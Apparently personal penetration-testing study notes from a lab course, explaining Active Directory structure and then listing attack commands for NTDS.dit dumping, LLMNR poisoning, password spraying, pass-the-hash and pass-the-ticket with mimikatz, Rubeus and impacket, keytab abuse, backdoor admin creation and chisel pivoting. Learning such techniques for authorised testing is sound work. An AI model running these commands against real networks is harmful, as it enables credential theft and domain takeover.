# Info

### Structure
- Forest: collection of domains
- Domain (tree): i.e. inlanefreight.local or freightlogistics.local
- Subdomains: i.e. dev.inlanefreight.local or dev.freightlogistics.local
- FQDN: Fully Qualified Domain Name. Complete name for a host. it has the hostname and domain name, i.e. `DC01.inlanefreight.local`
- Trust Boundaries: The two domains (inlanefreight and freightlogistics) may have bidirectional trust at the root domain level, however, that doesn't mean subdomains from inlanefreight can authenticate to subdomains of freightlogistics
- Objects: Any resource such as OUs, printers, users, domain controllers
- Attributes: assigned characteristics of an object, such as hostnames for a computer. All attributes have an associated LDAP name that can be queried.
- Schema: Defines what kinds of objects can exist in an AD environment.
- GUID: Global Unique Identifier. When an object is created, a 128-bit value is assigned to it. This value is unique across the enterprise environment. The `ObjectGUID` attribute stores this value. This property never changes.
- GPO: Group Policy Object. Collections of policy settings. A GPO has a GUID.
- Security Principals: anything that the OS can authenticate, such as users, computer accounts, or even processes. These are AD objects.
- Security Accounts Manager (SAM): manages local user accounts on a computer, NOT managed by AD.
- Security Identifier (SID): unique identifier for a security principal or security group.
- Distinguished Name (DN) describes the full path to an AD object. Ex. `cn=bjones, ou=IT, ou=Employees, dc=inlanefreight, dc=local`
	- The user bjones (common name) works in the IT department (organizational unit) as an employee (organizational unit), on the inlanefreight.local domain.
- Relative Distinguished Name (RDN): single component of the DN that identifies an object as unique from other objects on the same level. bjones is the RDN, and AD will not allow another bjones under the same parent container. However, two identical RDNs can exist as long as they are on different levels of organization.
	- `cn=bjones,dc=dev,dc=inlanefreight,dc=local` is different than `cn=bjones,dc=inlanefreight,dc=local`
- sAMAccountName: logon name. here is bjones
- userPrincipalName: this attribute combines the RDN with the domain name, i.e. `bjones@inlanefreight.local`
- Flexible Single Master Operation (FMSO): these roles allow DCs to continue authenticating without interruption if one of the DCs goes down.

## Users and Machine Accounts

### Local Accounts
- assigned rights on a host either individually or with group membership.
- Administrator (SID S-1-5-domain-500) is the first account on a Windows install. It cannot be removed but can be disabled or renamed. It has full control over almost all resources.
- Guest: diabled by default
- SYSTEM: or (NT AUTHORITY\SYSTEM): is the default account used by the Operating System to perform functions. This is not necessarily a *user* unlike the Administrator account - it represents the OS. It does *not* appear in User Manager and can't be added to groups.
- Network Service: predefined local account used by the Service Control Manager (SCM) for running Windows services. Network Services can present credentials to remote services.
- Local Service: another predefined local account used by the SCM for services. Has minimal privileges.

### Domain Users
- granted rights from the domain to access resources (devices) on the domain.
- Domain users can log in to any host that is configured for the domain.
- KRBTGT is the AD account for key distribution
- UserPrincipalName (UPN): primary logon for the user, usually the domain email address
- SAMAccountName: logon name that supports the previous version of windows clients
- `Get-ADUser -Identity [user]` to view user attributes
- RID vs. SID
	- SID is the domain identifier for all security principals (users, groups, machines) in a domain.
	- RID is a unique value for a newly created object within a domain, you will find it at the end of the SID for a security principal.

Non-Domain Joined computers: can have `workgroups` that are not managed by domain policy, but allow for sharing resources to other hosts in the workgroup.


NTDS.dit
- the heart of AD, stored on the DC at `C:\Windows\NTDS\` and is a database of AD information.
- Quick way to capture with netexec
	- `netexec smb [target] -u [user] -p [pass] --ntds`
- Crack the hashes with `hashcat -m 1000` 

Manual NTDS.dit capture:
- `net localgroup` to check if the account has local admin rights
- `net user [user]` to check domain privileges
- `vssadmin` can be used to copy the C: drive so we don't bring any applications down
	- `vssadmin Create Shadow \For=C:`
	- copy NITD.dit - `cmd.exe /c copy [shadow copy name]\Windows\NTDS\NTDS.dit [output location]`


### Groups

Groups vs. OUs: Groups are specifically for setting permissions for resource access. OUs can organize many types of objects (including users and groups) by applying different settings. Rather than permissions, OUs can deploy many users at a time that will have a certain set of organizational attributes, such as nomenclature characteristics.

In short:
- Groups = permissions
- OUs = configuration settings

- Group Type: defines the group's purpose
	- Two main types - security and distribution
	- Security groups: for ease of assigning permissions to a collection of users.
	- Distribution groups: used by email applications to distribute messages to group members. Functions like a mailing list. This type of group does not affect user permissions.
- Group Scope: shows how the group can be used within the domain
	- Domain Local Group: only used to manage permissions to domain resources in the domain where the group was created. Local groups from other domains can't be used, but a local group can contain users from another domain.
	- Global Groups: used to grant access to resources in another domain. global groups can only contain accounts from the domain it was created in.
	- Universal Groups: used to manage resources distributed across multiple domains.

Nested Group Membership: a Domain Local Group can have another Domain Local Group nested inside it. This means that a user in the nested group would inherit the privileges of the nested group and the parent group. It's important to be aware of privileges from the top of the chain to the bottom when assigning permissions. `Bloodhound` is useful for enumerating inherited privileges.


### Privileges

- Rights vs. Privileges: rights are assigned to a user or group with permissions to access objects. Privileges are permissions to perform actions.
- Some important built-in AD groups include:
	- Account Operators
	- Administrators
	- Backup Operators
	- Domain Admins, Computers, Controllers
	- Server Operators
- `Get-ADGroup -Identity "Server Operators" -Properties *`
- User Rights Assignment
	- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/user-rights-assignment
	- (these are SeBackupPrivilege etc.)
	- User Rights Vectors https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html
	- `whoami /priv`


## AD Hardening

- LAPS - Local Administrator Password Solution. This randomizes and rotates local admin passwords to prevent lateral movement.
- Group Policy Security Settings to look at:
	- Account Policies: how user accounts interact with the domain
	- Local Policies: automate host configurations on the domain to apply best security settings
	- Software Restriction Policies
	- Application Control Policies
- Account Separation: If the user `sjones` has some administrative functions over a software, he should have a `sjones_adm` with the rights to conduct those activities (or, the service's admin account)
# AD Protocols


Common ports used by services that `enum4linux` can access

| `nmblookup` | 137/UDP                                       |
| ----------- | --------------------------------------------- |
| `nbstat`    | **137/UDP**                                   |
| `net`       | **139/TCP, 135/TCP/UDP, 49152-65535/TCP/UDP** |
| `rpcclient` | **135/TCP**                                   |
| `smbclient` | **445/TCP**                                   |

#### Kerberos, port 88
- Authentication Protocol. The basis of this protocol is that the password is never transmitted over the internet.
- Grants tickets to users that allow access. Clients will send requests that are encrypted and Kerberos will decrypt the request with the stored password for that user to determine if the request is from a valid user.
- Client presents the TGT and gets a TGS (ticket granting service) in response. TGS is encrypted with the associated services NTLM hash. The TGS is presented to the service, which will then decrypt the TGS using the same hash.

#### DNS
- Active Directory Uses AD DS (Domain Services) to allow clients to locate Domain Controllers.
- If authenticated on the network, you can use `nslookup [domain]` to search for the IP address (or vice versa if you provide the IP address).

#### LDAP, port 389 or 636 (SSL)
- Lightweight Directory Access Protocol
- This is another authentication protocol for AD. Kerberos authenticates to the network, LDAP authenticates to services and directories within the network.

#### MSRPC
- Microsoft Remote Procedure Call
- Client-server model for applications

#### NTLM
- Another authentication protocol
- NTLM, NTLMv1, NTLMv2 are all symmetric key cryptography, one-way authentication, MD4 hashes, and are trusted by the Domain Controller.
- Kerberos is symmetric and asymmetric, uses MD5, and is trusted by the DC and the KDC (key distribution center).
- Hash format: `Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2:::`
	- Rachel: username
	- 500: RID (500 means administrator account)
	- First half is the LM hash. If LM hashes are disabled on the system (default since Windows 2008), this can't be used.
	- Second half is the NT hash. Can be cracked offline to reveal cleartext value, or, used for a PtH attack.
- NTLMv1 can NOT be used for PTH
- NTLMv1 example: `u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c`
- NTLMv2 example: `admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030`

#### MSCache2
- An offline storage of Domain Cached Credentials (DCC) to solve the issue of a network outage (meaning that Kerberos is no longer available).
- Hosts save the last 10 hashes for any domain users that successfully logged into the machine.
- Stored in `HKEY_LOCAL_MACHINE\SECURITY\Cache`
- Cannot be used in PTH
- Format `$DCC2$10240#bjones#e4e938d12fe5974dc42a90120bd9c90f`


# Enumeration

## AD Host Enumeration

See [[Enumeration#Enumerating the Network]] for more help
Once you have used the techniques below to identify hosts, use `nmap -A` to see if you can enumerate the name of the DC
### LLMNR & NBT-NS Primer

Link-Local Multicast Name Resolution and NetBIOS Name Service are an alternate method of host identification that can be used when DNS fails. LLMNR is UDP 5355. LLMNR/NBT-NS allows any host on the network to respond, meaning we can easily spoof if we have access to the network.

The goal is get the victim to communicate with our system and capture the NetNTLM hash for cracking.

#### Using Responder (from a Linux host)

`sudo responder -I [interface]`
- `-A` analyze mode, allows us to see NBT-NS or LLMNR requests without poisoning (just for recon, not useful for conducting this attack)
- `-wf` may not be necessary, but:
	- `-w` starts the WPAD rogue proxy server
	- `-f` attempts to fingerprint the remote host operating system and version
- Crack NTLMv2 hash with `hashcat -m 5600`
- logs are stored in `/usr/share/responder/logs`

#### Using Inveigh (from a Windows host)

- https://github.com/Kevin-Robertson/Inveigh
- `Import-Module \.Inveigh.ps1`
	- `(Get-Command Invoke-Inveigh).Parameters` view options
- LLMNR and NBNS Poisoning: `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
- `Inveigh.exe` is the C# tool that is still being updated (needs to be compiled)
	- run the program, and then press `ESC` to enter the interactive console
	- `GET NTLMV2UNIQUE`
	- `GET NTLMV2USERNAMES`
## AD User/Password Attacks

### Enumerate Users

AD specific wordlists 
- `jsmith.txt` or `jsmith2.txt` username lists from `Insidetrust` https://github.com/insidetrust/statistically-likely-usernames are common AD formats

Enumerate users and password policies
- `Kerbrute` https://github.com/ropnop/kerbrute.git
	- Setting up
		- `sudo make all` will compile all types of binaries and place them in `/kerbrute/dist`
		- Note: try to compile on the target if possible
		- move binaries into the PATH, such as `/usr/local/bin/kerbrute` to easily use from anywhere
	- `Kerbrute userenum -d [domain] --dc [IP] jsmith.txt -o [outfile]`
	- `userenum` will not lock out an account, however, if you use `kerbrute` for password spraying that is a potential consequence
- `rpcclient -U "" -N [IP]`
	- if a NULL session is configured, use `querydominfo`
- SMB NULL with `enum4linux`, see above in [[#AD Protocols]] for more service options
	- `-P` get password policy information via RPC
	- `-oA` outfile in YAML and JSON
- SMB Enumeration
	- `crackmapexec smb [IP] --users`
- LDAP Anonymous Bind `ldapsearch` or `windapsearch`
	- `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`
	- `windapsearch` is an easier tool to use
	- `windapsearch --dc-ip 172.16.5.5 -u "" -U`
- If authenticated on a Windows host:
	- `net accounts`

Once you have found a valid set of credentials through enumerating and password spraying, use `crackmapexec` to get a valid user list
- `sudo crackmapexec smb [IP] -u [valid_user] -p [valid_pass] --users`


### Password Spraying

It's common for local administrator accounts across a network to use similar credentials. If you find a set of credentials for a local admin account, spray across other machines in the domain. See under `crackmapexec`

#### From Linux

`Rpcclient`
- `Rpcclient` will not immediately show you a successful login, but you can `grep` for `Authority` in the response.
- One Liner: `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`

`Kerbrute`
- `kerbrute passwordspray -d [domain] --dc [IP] user_list.txt [password]`

`Crackmapexec`
- helpful to use `sudo`
- `sudo crackmapexec smb [IP] -u user_list.txt -p password1 | grep +`
- we `grep +` to filter out login failures
- `--continue-on-success` if needed to test all users
- Validate your finding by using `crackmapexec` again but with the proper login
- For spraying local admin accounts across many hosts:
	- `sudo crackmapexec smb --local-auth [IP] -u user -H [NTLM hash]`
	- `--local-auth` is necessary to prevent account lockouts by only trying to authenticate to the local account and not the domain account.

#### From Windows

`DomainPasswordSpray`
- https://github.com/dafthack/DomainPasswordSpray
- If the host is domain-joined you can skip using `-UserList` as the tool will enumerate users for you
- `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile [file] -ErrorAction SilentlyContinue`

`Kerbrute` is available on Windows as well


## Credentialed Enumeration

If you have a foothold or valid credentials (cleartext password, NTLM hash, local SYSTEM session) try these techniques for further access.

`crackmapexec`
- `smb`
	- `--users` enumerate Domain users
	- `--groups` enumerate Domain groups
	- `--loggedon-users` enumerate what users are logged in
		- If you execute this one and see `Pwn3d!` this means the credentials you entered are a local admin account
	- `--shares` enumerates available shares and the level of access we have for them
		- add `-M spider_plus --share 'share_name'` to dig through readable shares and list all files
		- Results are written to a JSON file in `/tmp/cme_spider_plus/[IP_of_host]`

`rpcclient`
- if NULL session is configured use `-U "" -N [IP]`
- RID is usually represented as an integer value but you will need the Hex equivalent for an rpcclient session. For example, the built-in Administrator account for the domain will always have the RID 500, or `0x1f4`.
- `enumdomusers` will show user RIDs
- `queryuser [RID]`

`impacket`
- `Psexec.py`
	- a clone of Sysinternals psexec
	- `impacket-psexec inlanefreight.local/[user]:'password'@172.10.10.10`
	- this will work if you get credentials for a user with local administrator privileges
- `wmiexec.py`
	- a more stealthy approach, but still likely caught by modern anti-virus

`windapsearch.py`
- Enumerates domain info using LDAP queries
- https://github.com/ropnop/windapsearch
- `--dc-ip`
- `-u user@domain`
- `-da` enumerate domain admins group
- `-PU` find privileged users
- `-G` enumerate groups
- `-U` enumerate users

`bloodhound.py`
- https://github.com/dirkjanm/BloodHound.py
- You can `pip install bloodhound`
- `-c` (`--collectionmethod`) can retrieve specific data such as users, groups, ACLs, or `all`
- `-ns [IP]` 
- `-d [domain]`
- will output logs in the current working directory
- see the `Active Directory BloodHound` for more learning on the GUI for bloodhound and advanced techniques that it offers.

### From a Windows Machine
Useful if your foothold is a Windows machine

`ActiveDirectory` PowerShell Module
- https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps
- `Get-ADDomain`
- `Get-ADUser`
- `Get-ADGroup`, and `Get-ADGroupMember -Identity "GroupName"` to view member list

`PowerView.ps1`
- `Get-DomainUser -Identity username -Domain domain.local
- `Get-DomainGroupMember -Identity "GroupName" -Recurse` identifies users in a group and enumerates nested groups with `-Recurse`

`Snaffler.exe`
- acquires credentials or other data in an AD environment.
- `Snaffler.exe -s -d domain.local -o snaffler.log -v data`

`SharpHound.exe`
- Data collector for Bloodhound
- https://github.com/SpecterOps/SharpHound
- `SharpHound.exe -c All --zipfilename filename` collects all kinds of data from an AD environment
- open `bloodhound` in CMD prompt, and `Upload Data` and select the created zip file

# Pass the Hash
Some of these techniques are very useful for pivoting within a network. Pay close attention to the IP address and domain you are using (and which device the hashes are for )

NTLM hashed stored on the DC are not salted and can be passed
- Once you log in as a user to one of the machines, enter `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` to disable restricted admin mode. 
- Then you can PTH with RDP. This will be necessary to open multiple command prompts and continuing to PTH to elevate permissions.

RDP
- `xfreerdp  /v:[IP] /u:[user] /pth:[hash]`
- See note at the top about disabling restricted admin mode to use RDP

Impacket
- `impacket-psexec [user]@[IP] -hashes [LM]:[NT]` opens a shell
	- if you only have `NT` hash for example, try `:[hash]`

Evil-winrm
- Useful if you don't have admin rights
- `evil-winrm -i [IP] -u [user] -H [hash]`
	- opens a shell

Netexec
- `netexec [protocol] [IP] -u [user] -d . -H [hash] -x [command]`
	- executes specified command
- `netexec [protocol] [IP/subnet] -u [user] -d . -H [hash] --local-auth`
	- adding `local-auth` will automatically try to authenticate to each host on the specified subnet with those credentials (useful if you found an Administrator hash)

Mimikatz
- `sekurlsa::pth` is a module to perform PtH
- on windows: `mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:[hash] /domain:inlanefreight.htb /run:cmd.exe" exit`
	- Allows you to use cmd.exe to execute commands as that user
	- use `/domain:localhost` to execute a cmd on local machine
	- specify another domain to try and connect to a Domain Controller or something

Powershell
- `Invoke-TheHash` https://github.com/Kevin-Robertson/Invoke-TheHash
	- You have to download the files onto the target, and import them into powershell with `Import-Module ./Invoke-TheHash.psd1` etc.
	- you need the target user to have admin rights (current user doesn't need those rights)
	- `Invoke-SMBExec -Target [IP] -Domain [domain] -Username [user] -Hash [hash] -Command "[command]"`
		-  You can also use this process to open a reverse shell by replacing the `-Command` with a PowerShell #3 payload from reverse shell generator
		- You can use the local target and try to connect to the Domain Controller or other machines by specifying the target and domain for it
	- `Invoke-SMBExec -Target [IP] -Domain [domain] -Username [user] -Hash [hash] -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose`
		- This command creates a new user named Mark and adds them to the admin group (we didn't get to log in as the person whose hash we had, we simply passed the hash and borrowed their rights for a process)


# Kerberos Tickets

## Export Kerberos Tickets

Instead of an NTLM hash, you can use a stolen Kerberos ticket.

If you get local administrator access, you can steal tickets stored by LSASS.

Tickets ending with $ correspond to the computer account. Tickets that have @ represent the user's name, service name, and domain name.

Mimikatz command usage
- `mimikatz.exe` -> `privilege::debug` -> `sekurlsa::tickets /export`
- these may not work anymore? wrong encryption type exported from Mimikatz?

Rubeus
- `Rubeus.exe dump /nowrap`

## Pass the Key (OverPass the Hash) (Forges a new TGT)
Converts a hash/key into a TGT. This is helpful when you have cleartext or hashed user password but need Kerberos authentication to access something.

Traditional PTH doesn't touch kerberos. Pass the Key or OverPass The Hash converts a hash/key into a Ticket-Granting-Ticket (TGT)

First use Mimikatz to extract user's hash:
- `mimikatz.exe` -> `privilege::debug` -> `sekurlsa::ekeys`

OverPass with Mimikatz (admin rights required)
- `mimikatz.exe` -> `privilege::debug` -> `sekurlsa::pth /domain: /user: /ntlm:`

OverPass with Rubeus (admin rights NOT required)
- can use rc4, aes128, aes256, or des
- `Rubeus.exe asktgt /domain: /user: /[type]: /nowrap`
- `[type]` example might be something like `/aes256:`


## Pass the Ticket

Mimikatz
- `mimikatz.exe` -> `privilege::debug` -> `kerberos::ptt "[path to .kirbi file]"`
- this doesn't really return anything, it just adds the ticket for you so you can access other resources that it grants

Opening a remote PS shell with PTT
- you can run PS scripts on remote computers, you need administrative permissions to do so (or, user can be in the Remote Management Users group)
- Conduct a PTT attack with the mimikatz or Rubeus instructions first
- Use the ticket to start a session from cmd:
	- `powershell` -> `Enter-PSSession -ComputerName [name]`
	- Assuming we imported a ticket that gave us access to the named computer/DC, this will open a remote PS shell on that device

Rubeus
- `Rubeus.exe asktgt /domain: /user: /[type] /ptt`
	- `[type]` would be hash type such as `/rc4:`
- Use a `.kirbi` ticket exported from mimikatz.exe (see `Export Kerberos Tickets`)
	- `Rubeus.exe ptt /ticket:[value]` 
	- `[value]` is from mimikatz output. Example:
	- `/ticket:[0;6c680]-2-0-40e10000-user@domain.kirbi`
- OR convert `.kirbi` ticket to a base64 string
	- Powershell `[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))`
	- Once you get the base64 string: `Rubeus.exe ptt /ticket:[string]`
- To PTT to another remote host and open PowerShell:
	- `Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show`
	- this will open a new cmd window, and we can execute Rubeus again in that window to request a new TGT with the `/ptt` option to import the ticket from our current session to the DC or target machine:
	- `Rubeus.exe asktgt /user: /domain: /[hash value]` -> `powershell` -> `Enter-PSSession -ComputerName [name]`

## Pass the Ticket (Linux)

### If there is a Linux machine in the domain:

keytab files and `ccache` files are two ways Linux machines store and use Kerberos credentials
- When you discover their owners, check the owner's domain permissions with `id [user@domain]` to see if they have Domain Admin permissions

Use `realm list` on the Linux machine to identify the domain it is joined to
	- if `realm` is not available, you can check for `sssd` and `winbind` in the running services
	- `ps -ef | grep -i "winbind"`
	- `crontab -l` and search for the word `kinit` to indicate Kerberos activity

Finding ccache files
- `ccache` files in Linux are usually stored in `/tmp` and in the environment variable `KRB5CCNAME`.
	- `env | grep -i krb5` 
	- view the permissions for them after you discover them

Abusing ccache files
- navigate to root directory on target machine (as root)
- `cp [ccache file] .`
- `export KRB5CCNAME=[path to ccache copy]`
- `klist` to check permissions.
- `smbclient //[domain controller]/[directory] -k -c ls -no-pass`

Finding keytab files
- Search for files with the word `keytab`
	- `find / -name *keytab* -ls 2>/dev/null`

Abusing KeyTab (krb5) Files
- You can impersonate a user by discovering KeyTab files
- `klist -k -t [path to keytab]`
- use `klist` again to confirm your access
- use `smbclient` or something to access their files
-  `python3 keytabextract.py [.keytab file]`
	- will extract NTLM hashes that can be used for PTH

Linikatz
- download from github
- execute

### Attacking from your linux machine

This uses `chisel`, `proxychains`, `impacket`, and an example with `evil-winrm` 

If you want to use Linux attack tools from your host machine, you need to proxy your traffic through the machine that gave you access. This example connects to `ms01`
- edit the `etc/hosts` file and add the LOCAL IP addresses of the access machine and the target domain controller. Also add the domain names
	- ex. `172.16.1.5  ms01.inlanefreight.htb ms01`
	- `172.16.1.10  inlanefreight.htb dc01.inlanefreight.htb dc01`
- modify the proxychain config to use socks5 and port 1080
	- `cat /etc/proxychains.conf`
	- should have the line `socks5 127.0.0.1 1080`
- Download chisel (github .gz file from releases)
	- `sudo ./chisel server --reverse`
	- connect to target with RDP, make sure it has chisel downloaded
		- `xfreerdp /v:[target] /u:[user] /d:inlanefreight.htb /p:[pass] /dynamic-resolution`
	- execute chisel on target and connect back to attacking machine
	- `c:\tools\chisel.exe client [IP]:[port] R:socks`
- Transfer files you need, such as a keytab from a Linux machine on the network, through proxy machine (`ms01`)

Impacket via proxychain
- Use the ticket you transferred with `impacket` and `proxychains` (compatible with a proxychain setup)
- Set the ticket to the `KRB5CCNAME` environment variable
	- some implementations of AD use the `FILE:` prefix in the file path when setting this variable, meaning the path for the variable needs to only include the path to the ccache file (not the file name at the end)
- `proxychains impacket-wmiexec [DC hostname] -k`


Evil-WinRM via a proxychain
- edit the `/etc/krb5.conf` file to change the `default_realm` and `kdc`
	- default_realm is the domain (`inlanefreight.htb`)
	- KDC is the controller address (`dc01.inlanefreight.htb`)
- `proxychains evil-winrm -i dc01 -r inlanefreight.htb`

Additionally, you can convert `ccache` (linux) to `kirbi` (windows) with `impacket`
- `impacket-ticketConverter [ccache file] [kirbi output]`